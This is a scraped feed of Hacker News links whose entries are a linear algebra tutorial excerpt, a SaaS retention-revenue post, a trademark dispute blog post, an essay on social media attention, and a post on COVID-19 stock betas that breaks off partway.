  <li><a href="#types-of-vectors">Types of vectors</a>
    <ul>
      <li><a href="#geometric-vectors">Geometric vectors</a></li>
      <li><a href="#polynomials">Polynomials</a></li>
      <li><a href="#elements-of-r">Elements of R</a></li>
    </ul>
  </li>
  <li><a href="#zero-vector-unit-vector-and-sparse-vector">Zero vector, unit vector, and sparse vector</a></li>
  <li><a href="#vector-dimensions-and-coordinate-system">Vector dimensions and coordinate system</a></li>
  <li><a href="#basic-vector-operations">Basic vector operations</a>
    <ul>
      <li><a href="#vector-vector-addition">Vector-vector addition</a></li>
      <li><a href="#vector-scalar-multiplication">Vector-scalar multiplication</a></li>
      <li><a href="#linear-combinations-of-vectors">Linear combinations of vectors</a></li>
      <li><a href="#vector-vector-multiplication-dot-product">Vector-vector multiplication: dot product</a></li>
    </ul>
  </li>
  <li><a href="#vector-space-span-and-subspace">Vector space, span, and subspace</a>
    <ul>
      <li><a href="#vector-space">Vector space</a></li>
      <li><a href="#vector-span">Vector span</a></li>
      <li><a href="#vector-subspaces">Vector subspaces</a></li>
    </ul>
  </li>
  <li><a href="#linear-dependence-and-independence">Linear dependence and independence</a></li>
  <li><a href="#vector-null-space">Vector null space</a></li>
  <li><a href="#vector-norms">Vector norms</a>
    <ul>
      <li><a href="#euclidean-norm">Euclidean norm: $L_2$</a></li>
      <li><a href="#manhattan-norm">Manhattan norm: $L_1$</a></li>
      <li><a href="#max-norm">Max norm: $L_\infty$</a></li>
    </ul>
  </li>
  <li><a href="#vector-inner-product-length-and-distance">Vector inner product, length, and distance</a></li>
  <li><a href="#vector-angles-and-orthogonality">Vector angles and orthogonality</a></li>
  <li><a href="#systems-of-linear-equations">Systems of linear equations</a></li>
</ul>

<p><strong><a href="#matrices">Matrices</a></strong>:</p>

<ul>
  <li><a href="#basic-matrix-operations">Basic matrix operations</a>
    <ul>
      <li><a href="#matrix-matrix-addition">Matrix-matrix addition</a></li>
      <li><a href="#matrix-scalar-multiplication">Matrix-scalar multiplication</a></li>
      <li><a href="#matrix-vector-multiplication-dot-product">Matrix-vector multiplication: dot product</a></li>
      <li><a href="#matrix-matrix-multiplication">Matrix-matrix multiplication</a></li>
      <li><a href="#matrix-identity">Matrix identity</a></li>
      <li><a href="#matrix-inverse">Matrix inverse</a></li>
      <li><a href="#matrix-transpose">Matrix transpose</a></li>
      <li><a href="#hadamard-product">Hadamard product</a></li>
    </ul>
  </li>
  <li><a href="#special-matrices">Special matrices</a>
    <ul>
      <li><a href="#rectangular-matrix">Rectangular matrix</a></li>
      <li><a href="#square-matrix">Square matrix</a></li>
      <li><a href="#diagonal-matrix">Diagonal matrix</a></li>
      <li><a href="#upper-triangular-matrix">Upper triangular matrix</a></li>
      <li><a href="#lower-triangular-matrix">Lower triangular matrix</a></li>
      <li><a href="#symmetric-matrix">Symmetric matrix</a></li>
      <li><a href="#identity-matrix">Identity matrix</a></li>
      <li><a href="#scalar-matrix">Scalar matrix</a></li>
      <li><a href="#null-or-zero-matrix">Null or zero matrix</a></li>
      <li><a href="#echelon-matrix">Echelon matrix</a></li>
      <li><a href="#antidiagonal-matrix">Antidiagonal matrix</a></li>
      <li><a href="#design-matrix">Design matrix</a></li>
    </ul>
  </li>
  <li><a href="#matrices-as-systems-of-linear-equations">Matrices as systems of linear equations</a></li>
  <li><a href="#the-four-fundamental-matrix-subsapces">The four fundamental matrix subsapces</a>
    <ul>
      <li><a href="#the-column-space">The column space</a></li>
      <li><a href="#the-row-space">The row space</a></li>
      <li><a href="#the-null-space">The null space</a></li>
      <li><a href="#the-null-space-of-the-transpose">The null space of the transpose</a></li>
    </ul>
  </li>
  <li><a href="#solving-systems-of-linear-equations-with-matrices">Solving systems of linear equations with matrices</a>
    <ul>
      <li><a href="#gaussian-elimination">Gaussian Elimination</a></li>
      <li><a href="#gauss-jordan-elimination">Gauss-Jordan Elimination</a></li>
    </ul>
  </li>
  <li><a href="#matrix-basis-and-rank">Matrix basis and rank</a></li>
  <li><a href="#matrix-norm">Matrix norm</a></li>
</ul>

<p><strong><a href="#linear-and-affine-mappings">Linear and affine mappings</a></strong>:</p>

<ul>
  <li><a href="#linear-mappings">Linear mappings</a></li>
  <li><a href="#examples-of-linear-mappings">Examples of linear mappings</a>
    <ul>
      <li><a href="#negation-matrix">Negation matrix</a></li>
      <li><a href="#reversal-matrix">Reversal matrix</a></li>
    </ul>
  </li>
  <li><a href="#examples-of-nonlinear-mappings">Examples of nonlinear mappings</a>
    <ul>
      <li><a href="#norms">Norms</a></li>
      <li><a href="#translation">Translation</a></li>
    </ul>
  </li>
  <li><a href="#affine-mappings">Affine mappings</a>
    <ul>
      <li><a href="#affine-combination-of-vectors">Affine combination of vectors</a></li>
      <li><a href="#affine-span">Affine span</a></li>
      <li><a href="#affine-space-and-subspace">Affine space and subspace</a></li>
      <li><a href="#affine-mappings-using-the-augmented-matrix">Affine mappings using the augmented matrix</a></li>
    </ul>
  </li>
  <li><a href="#special-linear-mappings">Special linear mappings</a>
    <ul>
      <li><a href="#scaling">Scaling</a></li>
      <li><a href="#reflection">Reflection</a></li>
      <li><a href="#shear">Shear</a></li>
      <li><a href="#rotation">Rotation</a></li>
    </ul>
  </li>
  <li><a href="#projections">Projections</a>
    <ul>
      <li><a href="#projections-onto-lines">Projections onto lines</a></li>
      <li><a href="#projections-onto-general-subspaces">Projections onto general subspaces</a></li>
      <li><a href="#projections-as-approximate-solutions-to-systems-of-linear-equations">Projections as approximate solutions to systems of linear equations</a></li>
    </ul>
  </li>
</ul>

<p><strong><a href="#matrix-decompositions">Matrix decompositions</a></strong>:</p>
<ul>
  <li><a href="#lu-decomposition">LU decomposition</a>
    <ul>
      <li><a href="#elementary-matrices">Elementary matrices</a></li>
      <li><a href="#the-inverse-of-elementary-matrices">The inverse of elementary matrices</a></li>
      <li><a href="#lu-decomposition-as-gaussian-elimination">LU decomposition as Gaussian Elimination</a></li>
      <li><a href="#lu-decomposition-with-pivoting">LU decomposition with pivoting</a></li>
    </ul>
  </li>
  <li><a href="#qr-decomposition">QR decomposition</a>
    <ul>
      <li><a href="#orthonormal-basis">Orthonormal basis</a></li>
      <li><a href="#orthonormal-basis-transpose">Orthonormal basis transpose</a></li>
      <li><a href="#gram-schmidt-orthogonalization">Gram-Schmidt Orthogonalization </a></li>
      <li><a href="#qr-decomposition-as-gram-schmidt-orthogonalization">QR decomposition as Gram-Schmidt Orthogonalization</a></li>
    </ul>
  </li>
  <li><a href="#determinant">Determinant</a>
    <ul>
      <li><a href="#determinant-as-measures-of-volume">Determinant as measures of volume</a></li>
      <li><a href="#the-2-x-2-determinant">The 2X2 determinant</a></li>
      <li><a href="#the-n-x-n-determinant">The NXN determinant</a></li>
      <li><a href="#determinants-as-scaling-factors">Determinants as scaling factors</a></li>
      <li><a href="#the-importance-of-determinants">The importance of determinants</a></li>
    </ul>
  </li>
  <li><a href="#eigenthings">Eigenthings</a>
    <ul>
      <li><a href="#change-of-basis">Change of basis</a></li>
      <li><a href="#eigenvectors-eigenvalues-and-eigenspaces">Eigenvectors, Eigenvalues, and Eigenspaces</a></li>
      <li><a href="#trace-and-determinant-with-eigenvalues">Trace and determinant with eigenvalues</a></li>
      <li><a href="#eigendecomposition">Eigendecomposition</a></li>
      <li><a href="#eigenbasis-are-a-good-basis">Eigenbasis are a good basis</a></li>
      <li><a href="#geometric-interpretation-of-eigendecomposition">Geometric interpretation of Eigendecomposition</a></li>
      <li><a href="#the-problem-with-eigendecomposition">The problem with Eigendecomposition</a></li>
    </ul>
  </li>
  <li><a href="#singular-value-decomposition">Singular Value Decomposition</a>:
    <ul>
      <li><a href="#singular-value-decomposition-theorem">Singular Value Decomposition Theorem</a></li>
      <li><a href="#singular-value-decomposition-computation">Singular Value Decomposition computation</a></li>
      <li><a href="#geometric-interpretation-of-the-singular-value-decomposition">Geometric interpretation of the Singular Value Decomposition</a></li>
      <li><a href="#singular-value-decomposition-vs-eigendecomposition">Singular Value Decomposition vs Eigendecomposition</a></li>
    </ul>
  </li>
  <li><a href="#matrix-approximation">Matrix Approximation</a>:
    <ul>
      <li><a href="#best-rank-k-approximation-with-svd">Best rank-k approximation with SVD</a></li>
      <li><a href="#best-low-rank-approximation-as-a-minimization-problem">Best low-rank approximation as a minimization problem</a></li>
    </ul>
  </li>
</ul>

<p><strong><a href="#epilogue">Epilogue</a></strong></p>



<p>While writing about linear mappings, I realized the importance of having a basic understanding of a few concepts before approaching the study of linear algebra. If you are like me, you may not have formal mathematical training beyond high school. If so, I encourage you to read this section and spent some time wrapping your head around these concepts before going over the linear algebra content (otherwise, you might prefer to skip this part). I believe that reviewing these concepts is of great help to understand the <em>notation</em>, which in my experience is one of the main barriers to understand mathematics for nonmathematicians: we are <em>non</em>native speakers, so we are continuously building up our vocabulary. I’ll keep this section very short, as is not the focus of this mini-course.</p>

<p>For this section, my notes are based on readings of:</p>

<ul>
  <li><strong>Geometric transformations (Vol. 1)</strong> (1966) by Modenov &amp; Parkhomenko</li>
  <li><strong>Naive Set Theory</strong> (1960) by P.R. Halmos</li>
  <li><strong>Abstract Algebra: Theory and Applications</strong> (2016) by Judson &amp; Beeer. <a href="http://abstract.pugetsound.edu/download/aata-20160809.pdf">Book link</a></li>
</ul>

<h2 id="sets">Sets</h2>

<p>Sets are one of the most fundamental concepts in mathematics. They are so fundamental that they are not defined in terms of anything else. On the contrary, other branches of mathematics are defined in terms of sets, including linear algebra. Put simply, <strong>sets are well-defined collections of objects</strong>. Such objects are called <strong>elements or members</strong> of the set. The crew of a ship, a caravan of camels, and the LA Lakers roster, are all examples of sets. The captain of the ship, the first camel in the caravan, and LeBron James are all examples of “members” or “elements” of their corresponding sets. We denote a set with an upper case italic letter as $\textit{A}$. In the context of linear algebra, we say that a line is a set of points, and the set of all lines in the plane is a set of sets. Similarly, we can say that <em>vectors</em> are sets of points, and <em>matrices</em> sets of vectors.</p>

<h2 id="belonging-and-inclusion">Belonging and inclusion</h2>

<p>We build sets using the notion of <strong>belonging</strong>. We denote that $a$ <em>belongs</em> (or is an <em>element</em> or <em>member</em> of) to $\textit{A}$ with the Greek letter epsilon as:</p>



<p>Another important idea is <strong>inclusion</strong>, which allow us to build <em>subsets</em>. Consider sets $\textit{A}$ and $\textit{B}$. When every element of $\textit{A}$ is an element of $\textit{B}$, we say that $\textit{A}$ is a <em>subset</em> of $\textit{B}$, or that $\textit{B}$ <em>includes</em> $\textit{A}$. The notation is:</p>



<p>or</p>



<p>Belonging and inclusion are derived from <strong>axion of extension</strong>: <em>two sets are equal if and only if they have the same elements</em>. This axiom may sound trivially obvious but is necessary to make belonging and …</p></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pabloinsente.github.io/intro-linear-algebra">https://pabloinsente.github.io/intro-linear-algebra</a></em></p>]]>
            </description>
            <link>https://pabloinsente.github.io/intro-linear-algebra</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058619</guid>
            <pubDate>Wed, 11 Nov 2020 14:24:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Retention Revenue Is Important in SaaS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058588">thread link</a>) | @randrews543
<br/>
November 11, 2020 | https://talkinsaasy.com/blog/why-retention-revenue-is-important-in-saas | <a href="https://web.archive.org/web/*/https://talkinsaasy.com/blog/why-retention-revenue-is-important-in-saas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" id="item-5fab3ba5a829a03e790cfc93"><div><div><div data-block-type="2" id="block-83f2beced4fc56fd9669"><div><p>Retention Revenue is the measure of how much revenue is left over after a startup has retained their customer month-to-month. It’s an important metric for subscription startups to calculate in order to understand their true CAC payback and profitability, so how do we get there?</p><p>First you take topline revenue, or the total amount of all of the subscriptions paid to you in that month. First you will want to calculate your gross revenue which is your total revenue minus your CORS (cost of revenue sold) which is typically hosting costs for software/tech companies, for services or physical goos this is more complicated, but the formula for Gross Revenue is below:</p><ul data-rte-list="default"><li><p><strong>Gross Revenue = Revenue - Cost of Goods Sold</strong></p></li></ul><p>After finding Gross Revenue we can now calculate our Retention Revenue. To get retention revenue you need to find your cost of servicing, marketing and success for your existing customer each month. Similar to how you calculate CAC by adding up sales and marketing costs.</p><p>You will wan to add up the cost of your customer success, customer service teams and customer marketing expenses to get your “retention expense” which is the cost that you had to incur to keep your customers (and their revenue). The formula to then calculate retention revenue is as follows:</p><ul data-rte-list="default"><li><p><strong>Retention Revenue = Gross Revenue - Customer Service Costs- Customer Success Costs - Customer Marketing Costs</strong></p></li></ul><p>Retention Revenue is the take how revenue at the end of the month after you have kept your customers. Using retention revenue is a more accurate way to understand the profitability. While there are other operating expenses that fall outside of the above retention expenses, on a per customer basis that is the best way for a startup, particularly one with recurring revenue, to understand your unit economics.</p><p>Think about a startup with a $2,500 CAC and a customer with a MRR of $300, that is a CAC Payback period of 8.3 months which is pretty good. But if we calculate their retention revenue that same customer only generates $180 in take home revenue at the end of the month making that CAC payback closer to 14 months. Now that might seem like a negative, but what this reveals us is an opportunity. We now have multiple levers to pull to drive towards profitability and sustainable growth. Maybe you do an analysis and realize you could automate the most common customer service requests and drive down your retention costs. Maybe you highlight your idea customer and tailor marketing messaging to drive down CAC. You can always upsell/add new features to increase your average monthly revenue as well.</p><p>A lot of early-stage SaaS companies avoid digging this deep for fear of the initial negative picture it paints. But the reporting economics off of top-line revenue actually can hurt growth long term and limits your visibility into growth levers and operational efficiency. Take the time to drill down to retention level metrics and you uncover a path to growth and sustainability for your startup.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://talkinsaasy.com/blog/why-retention-revenue-is-important-in-saas</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058588</guid>
            <pubDate>Wed, 11 Nov 2020 14:21:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Off-BRAND – A high-fashion brand, a local ice cream shop and IP]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058570">thread link</a>) | @VegetableArmy
<br/>
November 11, 2020 | https://www.legallyinsightful.com/2020/11/off-brand-how-high-fashion-brand-and.html | <a href="https://web.archive.org/web/*/https://www.legallyinsightful.com/2020/11/off-brand-how-high-fashion-brand-and.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h3>
OFF-BRAND - How a high-fashion brand and a local ice cream shop have come to blows over intellectual property
</h3>
</div><div>
<div id="post-body-4397561652220542783">
<h2><span>How a high-fashion brand and an ice cream shop have come to blows over intellectual property</span></h2><div><p><a href="https://1.bp.blogspot.com/-M9DU9zcfGEM/X6vx7TBn83I/AAAAAAAA5Uc/FcCL5fs2b-wqCxNbl6Evh7ZG5F0TgOaTACLcBGAsYHQ/s1920/ice%2Bcream.jpg"><img data-original-height="1281" data-original-width="1920" height="291" src="https://1.bp.blogspot.com/-M9DU9zcfGEM/X6vx7TBn83I/AAAAAAAA5Uc/FcCL5fs2b-wqCxNbl6Evh7ZG5F0TgOaTACLcBGAsYHQ/w435-h291/ice%2Bcream.jpg" width="435"></a></p></div><p><span data-preserver-spaces="true">In the various industries that are out there, not too many are as different as fashion and ice cream. One is involved in providing happiness, comfort and everything nice in this world and that other provides a sharp reminder that maybe that extra scoop of ice cream was too much. But suffice to say, a rift between the two industries is not something that you would expect to find.&nbsp;</span></p><p><span data-preserver-spaces="true">But as hype culture and the obsessive fandom on the internet have grown, the industries have been growing closer and closer together. But sadly, not in the way you think, we are still a few years off wearable ice cream. Instead, there is now a good chance that your local ice creamery sells merchandise. Less impressive, for sure. But this has become a staple for restaurants with even just a modicum of goodwill attached to their name and why not? If customers are willing to pay an extra $50 so that people will mistake them as an 'off the clock' employee, then go for it. However, it is always important to keep in mind that merely the fact that a store does not typically deal in goods from a particular industry, this does not exempt that store from the standard business conventions of that industry.&nbsp;</span></p><p><span data-preserver-spaces="true">This lesson was learnt recently by Afters Ice Cream, which after launching a line of merchandise was reportedly</span><span data-preserver-spaces="true">&nbsp;sued by the high-fashion brand, Off-White.&nbsp;</span></p><p><span data-preserver-spaces="true">Afters Ice Cream advertised a number of different types of clothing that featured the phrase 'Off-Diet' and using images similar to very notable Off-White works. Off-White claims that the merchandise is 'confusingly similar' to Off-White's graphics and registered trademarks. It also stated that "retail fixtures, signage, [and] interior décor" is intended to "confuse consumers into believing that [its] products are Off-White products and/or that [it or its] business is affiliated with Off-White."&nbsp;</span></p><p><span data-preserver-spaces="true">While it is ironic that the Off-White, a company which has been at the other end of numerous copyright infringement claims, even to the extent of a case being called&nbsp;</span><em>OffWhite Co v Off-White</em><span data-preserver-spaces="true">&nbsp;</span><em>LLC</em><span data-preserver-spaces="true">, was so quick to launch their own proceeding, however, the law is pretty straightforward concerning unlicensed reproduction of copyrighted works.&nbsp;</span></p><p><span data-preserver-spaces="true">But it is not all doom and gloom, and there is hope for the plucky ice cream store yet as due to use of humour in the respective shirts, a reproduction of copyrighted works could be okay if it is for the purposes of parody or satire.&nbsp;&nbsp;</span></p><p><span data-preserver-spaces="true">This concept was demonstrated in a recent case in the Ninth Circuit, where the makers of a dog toy that resembled a bottle of Jack Daniels Whiskey were found not to be infringing copyright as the dog toy was found to be humourous and expressive and not a sign of your dog falling off the wagon.&nbsp;</span></p><p><span data-preserver-spaces="true">As for the Off-White matter, we will have to wait and see if this matter progresses to court or if cooler heads prevail and the case is dropped.&nbsp;</span></p>
</div>

</div></div>]]>
            </description>
            <link>https://www.legallyinsightful.com/2020/11/off-brand-how-high-fashion-brand-and.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058570</guid>
            <pubDate>Wed, 11 Nov 2020 14:18:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Online conversation is the attention system of society – and it's broken]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25058548">thread link</a>) | @etherio
<br/>
November 11, 2020 | http://norse.horse/articles/attention-system-of-society.html | <a href="https://web.archive.org/web/*/http://norse.horse/articles/attention-system-of-society.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>
Humans are hypersocial animals; as soon as we invent something new, from signal fires to electricity,  we use it to communicate. Users of the very first computers would leave notes on the system for friends to read; today, Internet users spend on average over two hours per day using social media. As a cognitive scientist, Iâ€™m interested in how we use online tools to communicate, adjust our views, and make decisions; and Iâ€™m concerned about the effects of for-profit social media on conversation and debate. My generation is the last to have grown up writing letters - handwritten, meaningful messages from friends - and for-profit social media is psychologically very different.
</p><p>
In October 2017 three academics, concerned about Whatsappâ€™s influence on the Brazilian election, called for the Facebook-owned company to make it harder to share messages. Instant sharing means that an individual can reach many more people and that events, rumours and viewpoints can go viral in a few hours, sweeping across a country as a wave of copies is made. Importantly, the reader has no sense that the sender has taken the time to craft a communication; sharing is not an act of expression. Oversharing also swamps readers with the cognitive demand of reading hundreds of low-effort posts per day. Luckily for big social media, there is a solution at hand: the algorithm.
</p><p>
Facebook, Snapchat and Twitter originally showed new posts in chronological order. Today, they use news-feed algorithms to select the posts you see. The details of how these algorithms work and what they prioritise are murky, but two things are certain: they collect huge amounts of data on our behaviour, and they aim to maximise the time we spend logged in - not to give us the most interesting or meaningful material. If we argue with someone over an offensive post, the algorithm may counterproductively show us more posts like it. If you turn Facebookâ€™s algorithm off, it swiftly switches itself back on.
</p><p>
The tools we use to communicate online play a huge role in our lives: they help us choose our friends, fix our political and moral beliefs, and construct our personalities. I study attention, the set of brain processes which decide what details of the outside world are important. When you notice a bright light, screen out a distracting noise, or select the most trustworthy panellist in a debate, your attention system is at work. In the modern world, online communication tools enable and support social trends; they host flurries of political discourse during elections; and they allow the viral spread of ideas, from memes to movements. They are the attention system of society.
</p><p>
Before sharing and before the news-feed algorithm, individual people played a huge role in societyâ€™s online attention system. Millions of small decisions by individuals combined to select the topics that would dominate the headlines. But we have given up the job. With our news feeds curated by algorithms, we no longer decide what to read. We can still choose which groups to subscribe to or which friends to follow, but we have completely abnegated the most basic and central decision - what messages are put in front of our eyes.
</p><p>
So, using social media is a very different experience from reading or writing a letter. There is no natural end to the experience; there is little incentive to put time and care into writing a message; and there is no control over what you read. For-profit social media, being free, is not a product. Neither is it a a service; it does not give us the options we need to control it. Social media is an experience designed to attract and retain us - so that we can provide the attention which earns Facebook Â£20 per year per user in advertising revenue, and the behaviour data which is its most valuable asset.
</p><p>
The consequences of our societyâ€™s new attention system are extremely serious. Before the 2016 referendum on EU membership, over Â£2.7m was spent on often-misleading Facebook adverts by an unregulated consortium of lobbying organisations which conspired to break the Electoral Commissionâ€™s rules on data sharing. Shortly before the last US election, $70 million per month was spent on social media advertising by the Trump campaign, using voter data stolen through a Facebook loophole to predict personalities and target political ads. 
</p><p>
I believe that the best way to highlight the harmful effects of oversharing and news-feed algorithms is to build a platform that supports conversation, discussion, and independent thought rather than prioritising sharing and screen time. A communication tool should not be an experience; it should be a true service, one which puts readersâ€™ and writersâ€™ needs first by giving them the tools to control what they read and who reads their conversations.
</p><p>
We all have a right to freedom of speech - but we don't automatically have the right to broadcast. We need to think carefully about public groups - spaces which can go viral and take on a life of their own. A closed group canâ€™t go viral or expand into a huge community. Public groups can connect you with like-minded people and show you interesting material, but when people disagree on topics close to their heart - human rights, economic policy - public groups descend into chaos or censorship. Their owners or controllers may be unclear; they must use moderators, whose rules are often unfair; and by suppressing conflicting opinions they encourage the development of filter bubbles. What we read online should be selected by individualsâ€™ decisions, not by the moderators of anonymous groups or by algorithms trained for profit.
</p><p>
It is certainly easier to immerse yourself in the experience of for-profit social media. But I believe that conversation and debate should be more than a passive experience: they require effort, engagement and attention. Every day, we spend hours reading and conversing online. Just as we are careful with what we eat and drink, we should be careful with what we read, what we allow to influence us, and to whom we delegate the responsibility of choosing what is put in front of our eyes. The days of letter-writing may have passed, but the experience of reading a message carefully written for you, conveyed to you by a system whose only purpose is to support communication, should live on.
</p>





</div></div>]]>
            </description>
            <link>http://norse.horse/articles/attention-system-of-society.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058548</guid>
            <pubDate>Wed, 11 Nov 2020 14:15:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What mother never told you about VM service (1983) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25058543">thread link</a>) | @fanf2
<br/>
November 11, 2020 | http://www.leeandmelindavarian.com/Melinda/tutorial.pdf | <a href="https://web.archive.org/web/*/http://www.leeandmelindavarian.com/Melinda/tutorial.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.leeandmelindavarian.com/Melinda/tutorial.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058543</guid>
            <pubDate>Wed, 11 Nov 2020 14:15:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Covid-19 Beta]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058503">thread link</a>) | @simonpure
<br/>
November 11, 2020 | https://reasonabledeviations.com/2020/11/09/covid-beta/ | <a href="https://web.archive.org/web/*/https://reasonabledeviations.com/2020/11/09/covid-beta/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  
  
  
  <p>In this short post, we compute and visualise “COVID-19 betas” for stocks in the S&amp;P500 index, to quantitatively and visually understand which companies were most affected (positively and negatively) by COVID-19.</p>

<!--more-->
<p>For those of you who just want to see the (interactive!) result, here it is. Click on any sector to zoom in on its constituents:</p>





<p>If you would like to generate this plot for yourself, perhaps using a different basket of stocks, the Jupyter notebook is <a href="https://github.com/robertmartin8/RandomWalks/blob/master/COvidBeta/CovidBeta.ipynb">here</a>.</p>

<p><em>Note: most of this post was written before November 9th 2020, the day on which Pfizer announced incredibly encouraging results regarding their vaccine.</em></p>

<h2 id="motivation">Motivation</h2>

<p>Let’s go back in time to the start of 2020. Despite aggressive trade rhetoric, 2019 has been a great year for markets, with the S&amp;P500 up about 30%. Thanks to low rates (and the Fed’s commitment to loose monetary policy), the “blip” of 2018Q4 is nothing more than a distant bad dream. Big tech is killing it; multiples are expanding; volatility is at a comfortable low.</p>

<p>On January 4th, the World Health Organisation (WHO) <a href="https://twitter.com/WHO/status/1213523866703814656?s=20">tweets</a> that there is a cluster of pneumonia cases in Wuhan, China. As far as the West is concerned, this is a non-event, happening way “over there” in the East. On January 13th, a case is recorded in Thailand. What follows is two months of health officials gathering and mulling over the evidence (on January 23rd an independent committee reports that there is insufficient evidence to make a decision), while the rest of the world continues on blissfully unaware of the worsening situation. The markets continue their steady rise, largely unperturbed.</p>

<p>In February, the situation becomes hard to ignore; by February 13th, COVID-19 is present in 25 countries, with more than 60,000 cases (<a href="https://www.thinkglobalhealth.org/article/updated-timeline-coronavirus">source</a>). On the 14th of February, market participants suddenly seem to appreciate the gravity of the situation; in one short month, the S&amp;P500 loses 1/3 of its value. People who have been diligently following the prevailing personal finance advice and investing their money in the stock markets are suddenly faced with an unprecedentedly rapid loss of net worth. Speculators, who have been riding the rally with leverage, are caught with their trousers down.</p>

<p>By March, there is full-on panic as the worldwide number of cases hits 100,000 and nations start to impose heavy travel restrictions.  What had started as whispers of a viral cough “far away in the East” has now blown up into the terrifying spectre of an omnipresent contagion – $R_0$ numbers suggest that before long, the majority of the world population will be infected by a virus whose severity is still unknown. Readers of mainstream news could be forgiven for thinking that it is the end of the world as we know it.</p>

<p>Cut to 18th August – 6 months later. The S&amp;P500 has just posted a new all-time high, having appreciated about 50% from the low of March 20th.</p>

<center>
<img src="https://reasonabledeviations.com/assets/images/covid_beta/spy_covid.png">
</center>

<p>I have written this dramatised account largely as a note-to-self. With the rose-tinted spectacles of hindsight, it is now clear that the widespread and indiscriminate risk-off in March created a fantastic opportunity for level-headed investors to pick up high-quality companies, well suited to a social-distanced society, at steep discounts. Many of us are now kicking ourselves for not having bought more, but we must remember that in the moment, the future was murky indeed.</p>

<p>All this said, things certainly aren’t back to where they were. Only a handful of companies (mostly big tech) have been responsible for the majority of the market’s rebound. Whether you are optimistic or pessimistic about how the pandemic plays out from here, as long as you think COVID-19 is a key driver for stock markets it is important to know how different sectors or companies are affected by the virus. Optimists might be keen to identify which stocks have been hardest hit, to play the rebound, while those who think that the situation will stay unresolved for longer than consensus expects may want to remain overweight the companies that thrive in a pandemic environment.</p>

<p>The goal of this investigation, therefore, is to develop a highly intuitive tool to allow the viewer to understand, at a glance, which companies respond <em>well</em> and <em>badly</em> to COVID-19 news.</p>

<h2 id="methodology">Methodology</h2>

<p>The standard approach is “armchair reasoning”: sitting down and logically thinking through what the impacts of COVID-19 have been / will be.
On April 2nd 2020, I made this brainstorming mindmap to reason about some of the second-order implications of the pandemic. Several of the companies I mentioned, which may seem obvious in hindsight, have done very well:</p>

<center>
<img src="https://reasonabledeviations.com/assets/images/covid_beta/covid_brainstorming.png">
</center>

<p>Alternatively, we might adopt the “data-driven” approach: let market performance tell you which stocks benefitted most and least from COVID-19. Naively, we could simply look at which stocks/sectors have performed best/worst this year. This is a reasonable starting point but contains a lot of noise because stocks move up and down for all sorts of reasons.</p>

<p>A better methodology for understanding how some factor (in our case, COVID-19) affects stock prices is is to compute the <strong>beta</strong> of the asset returns to the factor. Concretely, we examine the correlation between the daily change in stock prices and the daily increases in COVID-19 cases: if a stock tends to have negative returns whenever COVID cases rise, we may believe that there is some association between COVID and the stock. The nice thing about this approach is that we can remove the effects of as many other variables as we want by introducing them as additional regression variables.</p>

<p>In this post, we will regress stock returns against both COVID-19 cases and the overall S&amp;P500 index (the latter being what people typically call <em>the</em> beta, though it is really just <em>a</em> beta). This serves to identify the effect of COVID-19 on the stock <em>in excess</em> of the overall market effects, which should give a more accurate picture of how COVID-19 is affecting a stock.</p>

<p>I pulled COVID data from the New York Times’ <a href="https://github.com/nytimes/covid-19-data">GitHub repo</a>, and as usual, I used Yahoo Finance (via the <code>yfinance</code> python library) for stock/index pricing data. The “heavy lifting” – regressing stock returns against SPY returns and the change in daily cases – was done by the linear regression class within <code>scikit-learn</code>.</p>

<h2 id="analysis-and-visualisation">Analysis and Visualisation</h2>

<p>A higher COVID beta means that a stock’s returns were <em>positively</em> correlated with the change in COVID cases, i.e. more COVID cases helped the stock. Perhaps unsurprisingly, among the stocks with the highest COVID betas were Netflix, Walmart, Hasbro, Intel, and Citrix (enterprise technology). Conversely, the stocks with the most negative COVID betas include hard-hit companies in the energy and consumer discretionary sectors. This is encouraging, as our methodology passes the basic sanity check. Tech companies like Netflix were clear winners from national lockdowns, while energy companies faced a massive demand shock as people no longer drove to work or travelled overseas.</p>

<p>To summarise the betas in one clear diagram, I drew inspiration from the Bloomberg terminal heatmap, which gives an instant “pulse” of the market with respect to one key variable (with the size of a rectangle representing market caps):</p>

<center>
<img src="https://reasonabledeviations.com/assets/images/covid_beta/CovidBeta.png">
</center>

<p>(Note: we don’t see a large blue rectangle corresponding to Zoom because Zoom isn’t yet in the S&amp;P500 index)</p>

<p>At a first glance, this graphic seems to accurately describe much of our intuition regarding what COVID has benefitted/harmed. Tech is largely blue (benefitting), as are healthcare and consumer staples. Energy has been particularly hard hit, with financials having a tough time also. But the effect of COVID on other sectors may not be as obvious, and it is here where the visualisation becomes especially helpful.</p>

<p><em>Note regarding the Pfizer news of November 9th 2020</em></p>

